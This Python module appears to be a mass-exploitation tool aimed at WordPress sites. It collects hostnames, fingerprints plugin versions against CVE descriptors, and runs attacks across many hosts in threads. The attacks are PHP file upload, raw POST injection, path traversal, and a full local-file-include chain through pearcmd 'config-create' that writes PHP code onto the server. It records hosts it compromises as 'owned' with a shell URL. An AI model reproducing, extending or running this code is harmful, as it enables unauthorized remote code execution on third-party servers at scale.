"""Vulnerability-driven target pipeline.

Descriptors live in data/vuln/<CVE>/vuln.json. A descriptor is data only:
oracles -> affected range -> exploit -> marker.
"""
import json
import os
import random
import re
import string
import threading
import time

from core import http
from core import oracles

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DB = os.path.join(ROOT, "data", "vuln")
RUNS = os.path.join(ROOT, "data", "runs")
PREFETCH = os.path.join(DB, "_prefetch.jsonl")
PREFETCH_TTL = 86400

_TL = threading.local()
_LOCK = threading.Lock()
_STOP = threading.Event()


def stop():
    _STOP.set()


def stopped():
    return _STOP.is_set()


def deadline(sec):
    _TL.dl = time.time() + sec


def _left():
    dl = getattr(_TL, "dl", None)
    if dl and time.time() > dl:
        raise TimeoutError("target deadline")


def _req(method, url, **kw):
    _left()
    kw.setdefault("tries", 1)
    if url.startswith("http"):
        from urllib.parse import urlsplit
        parts = urlsplit(url)
        host = parts.netloc
        path = (parts.path or "/") + (("?" + parts.query) if parts.query else "")
    else:
        host, path = url, "/"
    return http.request(host, path, method=method, **kw)


def _rnd(n=10):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _vparse(s):
    return tuple(int(x) for x in re.findall(r"\d+", s or "")) or (0,)


def _vcmp(a, b):
    a, b = _vparse(a), _vparse(b)
    n = max(len(a), len(b))
    a += (0,) * (n - len(a))
    b += (0,) * (n - len(b))
    return (a > b) - (a < b)


def _affected(version, rule):
    c = _vcmp(version, rule.get("version", "0"))
    return {"<": c < 0, "<=": c <= 0, "==": c == 0,
            ">=": c >= 0, ">": c > 0}.get(rule.get("op", "<="), False)


def load(cve_id):
    p = os.path.join(DB, cve_id, "vuln.json")
    if not os.path.isfile(p):
        raise SystemExit("no descriptor: " + p)
    with open(p, encoding="utf-8") as f:
        v = json.load(f)
    if "oracles" not in v and "detect" in v:
        d = v["detect"]
        v["oracles"] = [{"kind": "readme", "path": d["path"],
                         "regex": d.get("version_regex", ""), "w": 2}]
    v.setdefault("oracles", [])
    return v


def catalog():
    out = []
    if not os.path.isdir(DB):
        return out
    for d in sorted(os.listdir(DB)):
        if d.startswith("_"):
            continue
        p = os.path.join(DB, d, "vuln.json")
        if os.path.isfile(p):
            try:
                with open(p, encoding="utf-8") as f:
                    v = json.load(f)
                out.append((v.get("id", d), v.get("title", ""), v.get("plugin", "")))
            except Exception:
                pass
    return out


def sink_path(cve_id):
    d = os.path.join(DB, cve_id)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, "targets.jsonl")


def list_path(cve_id):
    return os.path.join(DB, cve_id, "list.txt")


def _read_jsonl(p):
    if not os.path.isfile(p):
        return
    with open(p, encoding="utf-8") as f:
        for line in f:
            try:
                yield json.loads(line)
            except Exception:
                continue


def seen(cve_id):
    return {r.get("host") for r in _read_jsonl(sink_path(cve_id))
            if r.get("state") in ("owned", "not_vuln", "prefilter_fail")}


def sink(rec):
    with _LOCK:
        with open(sink_path(rec["cve"]), "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")


def tail(cve_id, n=40):
    return list(_read_jsonl(sink_path(cve_id)))[-n:]


def grab(cve_id):
    return [r for r in _read_jsonl(sink_path(cve_id)) if r.get("state") == "owned"]


def sources_run():
    if not os.path.isdir(RUNS):
        return []
    dirs = [os.path.join(RUNS, d) for d in os.listdir(RUNS)]
    dirs = [d for d in dirs if os.path.isdir(d)]
    if not dirs:
        return []
    latest = max(dirs, key=os.path.getmtime)
    hosts = set()
    for name in os.listdir(latest):
        if not name.endswith(".txt"):
            continue
        with open(os.path.join(latest, name), encoding="utf-8", errors="ignore") as f:
            for m in re.finditer(r"\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,24})\b",
                                 f.read(), re.I):
                hosts.add(m.group(1).lower())
    return sorted(hosts)


def append_list(cve_id, hosts):
    p = list_path(cve_id)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    if os.path.isfile(p) and os.path.getsize(p):
        with open(p, "rb") as f:
            f.seek(-1, 2)
            if f.read(1) != b"\n":
                with open(p, "a", encoding="utf-8") as g:
                    g.write("\n")
    with open(p, "a", encoding="utf-8") as f:
        for h in hosts:
            h = h.strip()
            if h:
                f.write(h + "\n")


def list_count(cve_id):
    p = list_path(cve_id)
    if not os.path.isfile(p):
        return 0
    with open(p, encoding="utf-8", errors="ignore") as f:
        return sum(1 for ln in f if ln.strip())


def sources_file(path):
    with open(path, encoding="utf-8", errors="ignore") as f:
        return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]


def _prefetch(host):
    base = host if "://" in host else "https://" + host
    try:
        r = _req("GET", base, allow_redirects=True)
    except Exception as e:
        return {"host": host, "ts": int(time.time()), "ok": False, "why": type(e).__name__}
    code = getattr(r, "status_code", 0) or 0
    body = (getattr(r, "text", "") or "")[:200000]
    wp = "wp-content" in body or "wp-json" in body or "wp-includes" in body
    return {"host": host, "ts": int(time.time()), "ok": code and code < 500 and wp,
            "why": "home:%s wp:%s" % (code, wp), "final_url": str(getattr(r, "url", base))}


def _cached_prefetch(host):
    for r in _read_jsonl(PREFETCH):
        if r.get("host") == host and time.time() - r.get("ts", 0) < PREFETCH_TTL:
            return r
    r = _prefetch(host)
    with _LOCK:
        os.makedirs(DB, exist_ok=True)
        with open(PREFETCH, "a", encoding="utf-8") as f:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    return r


def _multipart(fields, file_field, filename, content):
    b = "----pbl" + _rnd(14)
    parts = []
    for k, val in fields.items():
        parts.append('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (b, k, val))
    parts.append('--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\n'
                 'Content-Type: application/x-php\r\n\r\n%s\r\n' % (b, file_field, filename, content))
    parts.append("--%s--\r\n" % b)
    return "".join(parts).encode("utf-8"), "multipart/form-data; boundary=" + b


def _exploit(base, ex, marker):
    rnd = _rnd(8)
    kind = ex.get("type", "get_traversal")
    url = base + ex["url"] if ex.get("url") else base

    if kind == "wp_template_lfi":
        return _wp_lfi(base, ex, marker)

    if kind == "multipart_upload":
        fname = ex.get("filename", "pbl{rand}.php").replace("{rand}", rnd)
        body, ctype = _multipart(ex.get("fields", {}), ex.get("file_field", "upload[]"),
                                 fname, ex.get("content", "<?php echo '{marker}'; ?>").replace("{marker}", marker))
        _req("POST", url, body=body, ctype=ctype)
        verify = base + ex["verify"].replace("{rand}", rnd)
        v = _req("GET", verify)
        return marker in (getattr(v, "text", "") or ""), "upload:%s status:%s" % (
            fname, getattr(v, "status_code", 0)), verify

    if kind == "post_raw":
        body = ex.get("body", "").replace("{marker}", marker).encode("utf-8")
        _req("POST", url, body=body, ctype=ex.get(
            "content_type", "application/x-www-form-urlencoded"))
        for cand in ex.get("verify_extra", [ex.get("verify", "")]):
            if not cand:
                continue
            v = _req("GET", base + cand)
            if marker in (getattr(v, "text", "") or ""):
                return True, "post_raw:%s" % cand, base + cand
        return False, "post_raw:no marker", ""

    rx = ex.get("success_regex", "")
    base404 = 0
    try:
        br = _req("GET", base + "/pbl-missing-" + rnd + ".php")
        base404 = len(getattr(br, "text", "") or "")
    except Exception:
        pass
    last = ""
    for u in ex.get("urls") or [ex["url"]]:
        r = _req("GET", base + u)
        text = getattr(r, "text", "") or ""
        last = "traversal status:%s len:%d" % (getattr(r, "status_code", 0), len(text))
        if not rx:
            continue
        for m in re.finditer(rx, text):
            tail = text[m.end():m.end() + 400]
            if "sourceURL" not in tail[:120] and "language_urls" not in text[max(0, m.start() - 200):m.start()]:
                return True, last, base + u
        if base404 and abs(len(text) - base404) > base404 * 0.05:
            return True, last + " (отличается от 404)", base + u
    return False, last, ""


def _chrlit(t):
    return ".".join("chr(%d)" % ord(c) for c in t)


def _denc(p):
    return p.replace("/", "%2F").replace(".", "%2E").replace("%", "%25")


def _find_page(base):
    for route in ("/wp-json/wp/v2/pages?per_page=100&_fields=id,slug,template",
                  "/index.php?rest_route=/wp/v2/pages&per_page=100&_fields=id,slug,template"):
        try:
            r = _req("GET", base + route)
            data = json.loads(getattr(r, "text", "[]"))
        except Exception:
            continue
        if isinstance(data, list) and data:
            for p in data:
                if not p.get("template"):
                    return p.get("id")
            return data[0].get("id")

    for sm in ("/wp-sitemap-posts-page-1.xml", "/sitemap.xml", "/page-sitemap.xml"):
        try:
            r = _req("GET", base + sm)
        except Exception:
            continue
        if getattr(r, "status_code", 0) != 200:
            continue
        for loc in re.findall(r"<loc>([^<]+)</loc>", getattr(r, "text", "") or ""):
            if "/wp-content/" in loc or loc.rstrip("/") == base.rstrip("/"):
                continue
            try:
                pr = _req("GET", loc)
            except Exception:
                continue
            m = re.search(r"page-id-(\d+)", getattr(pr, "text", "") or "")
            if m:
                return int(m.group(1))
    return None


def _wp_lfi(base, ex, marker):
    """CVE-2026-87902: pagename traversal -> template include -> PEAR write gadget."""
    CT = "application/x-www-form-urlencoded"
    try:
        hr = _req("GET", base + "/")
        html = getattr(hr, "text", "") or ""
    except Exception:
        return False, "lfi:no-home", ""
    themes = sorted(set(re.findall(r"/wp-content/themes/([a-z0-9._-]+)/", html)))
    if not themes:
        return False, "lfi:no-theme", ""
    theme = themes[0]

    pid = _find_page(base)
    if not pid:
        return False, "lfi:no-page", ""

    def post(pname, query=""):
        body = ("page_id=%d&pagename=%s" % (pid, _denc(pname))).encode()
        return _req("POST", base + "/" + query, body=body, ctype=CT)

    ref = len(getattr(post("pbl-nope-" + _rnd(6)), "text", "") or "")

    dirs = list(ex.get("theme_dirs", ["page-templates"]))
    try:
        ls = _req("GET", base + "/wp-content/themes/" + theme + "/")
        if getattr(ls, "status_code", 0) == 200:
            found = sorted({d for d in re.findall(r"\b(page-[a-z0-9._-]+)/", getattr(ls, "text", "") or "")})
            if found:
                dirs = found
    except Exception:
        pass

    good = []
    for td in dirs:
        pre = td[5:] if td.startswith("page-") else td
        for tail in ("../header", "../index"):
            try:
                n = len(getattr(post(pre + "/" + tail), "text", "") or "")
            except Exception:
                continue
            if ref and n and abs(n - ref) > ref * 0.02:
                good.append(td)
                break
    if not good:
        return False, "lfi:no-dir " + theme, ""

    payload = "<?=" + _chrlit(marker) + "?>"
    out = ex.get("output", "/tmp/pbl") + _rnd(6)
    last = ""

    for td in good:
        pre = td[5:] if td.startswith("page-") else td
        for depth in (4, 3, 5, 6):
            for inc in ex.get("includes", ["/usr/local/lib/php/pearcmd"]):
                incp = pre + "/" + "../" * depth + inc.lstrip("/")
                outp = pre + "/" + "../" * depth + out.lstrip("/")
                try:
                    r1 = _req("POST", base + "/?+config-create+/" + payload + "+" + out + ".php",
                              body=("page_id=%d&pagename=%s" % (pid, _denc(incp))).encode(), ctype=CT)
                    t1 = getattr(r1, "text", "") or ""
                    pear = "PEAR_" in t1 or "Commands:" in t1 or "Warning:" in t1
                    r2 = post(outp)
                except Exception as e:
                    last = "lfi:" + type(e).__name__
                    continue
                last = "lfi:%s d%d %s" % (td, depth, inc)
                if marker in (getattr(r2, "text", "") or ""):
                    return True, "rce " + last, base + "/"
                if pear:
                    return True, "pear " + last, base + "/"
    return False, last, ""


def probe(host, v, tmo, marker):
    rec = {"host": host, "cve": v["id"], "ts": int(time.time()), "state": "candidate"}
    base = host if "://" in host else "https://" + host
    deadline(tmo)

    pf = _cached_prefetch(host)
    rec["final_url"] = pf.get("final_url", base)
    if not pf.get("ok"):
        rec["state"] = "prefilter_fail"
        rec["evidence"] = pf.get("why", "")
        return rec

    res = oracles.evaluate(base, v["oracles"], _req, os.path.join(DB, v["id"]))
    rec["evidence"] = "; ".join(res["evidence"])[:400]
    if res.get("votes"):
        rec["votes"] = res["votes"]
    if res.get("conflict"):
        rec["conflict"] = True

    ver = res.get("version")
    if ver:
        rec["version"] = ver
        if not _affected(ver, v.get("affected", {})):
            rec["state"] = "not_vuln"
            return rec
    elif not res.get("alive"):
        rec["state"] = "not_vuln"
        return rec

    rec["state"] = "confirmed"
    sink(dict(rec))

    _ex = v.get("exploit") or {}
    if not _ex or not (_ex.get("url") or _ex.get("type") == "wp_template_lfi"):
        return rec

    try:
        ok, ev, vurl = _exploit(base, v.get("exploit", {}), marker)
    except Exception as e:
        rec["state"] = "error"
        rec["evidence"] = "exploit:" + type(e).__name__
        return rec

    rec["evidence"] = ev
    if ok:
        rec["state"] = "owned"
        rec["shell"] = vurl
    return rec


def run(cve_id, hosts, threads=8, tmo=90, limit=0, stop_fn=None):
    _STOP.clear()

    def _halt():
        return _STOP.is_set() or (stop_fn is not None and stop_fn())

    v = load(cve_id)
    marker = "PBL" + _rnd(12).upper()
    done = seen(cve_id)
    queue = [h for h in hosts if h and h not in done]
    if limit:
        queue = queue[:limit]
    if not queue:
        return []

    slots = threading.BoundedSemaphore(threads)
    out = []
    idx = [0]
    total = len(queue)

    def worker():
        while not _halt():
            with _LOCK:
                if idx[0] >= total:
                    return
                host = queue[idx[0]]
                idx[0] += 1
            with slots:
                try:
                    rec = probe(host, v, tmo, marker)
                except Exception as e:
                    rec = {"host": host, "cve": cve_id, "ts": int(time.time()),
                           "state": "error", "evidence": type(e).__name__}
                sink(rec)
                with _LOCK:
                    out.append(rec)
                    print("[%d/%d] %-40s %-14s %s" % (idx[0], total, host[:40],
                                                      rec["state"], rec.get("evidence", "")))

    th = [threading.Thread(target=worker, daemon=True) for _ in range(min(threads, total))]
    for t in th:
        t.start()
    for t in th:
        t.join()
    return out